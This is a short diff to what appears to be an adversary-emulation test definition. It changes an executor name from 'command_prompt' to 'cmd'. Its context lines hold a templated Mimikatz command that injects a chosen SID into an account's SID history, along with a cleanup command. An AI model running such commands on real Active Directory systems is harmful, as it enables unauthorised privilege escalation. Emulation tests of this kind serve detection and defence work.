@@ -33,8 +33,8 @@ steps:
     - name: injection-sid-history-with-mimikatz
       inline: |
         {{.Args.mimikatz_path}} "privilege::debug" "sid::patch" "sid::add /sid:{{.Args.sid_to_inject}} /sam:{{.Args.sam_account_name}}" "exit"
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             {{.Args.mimikatz_path}} "sid::clear /sam:{{.Args.sam_account_name}}" "exit"
-        executor: command_prompt
+        executor: cmd
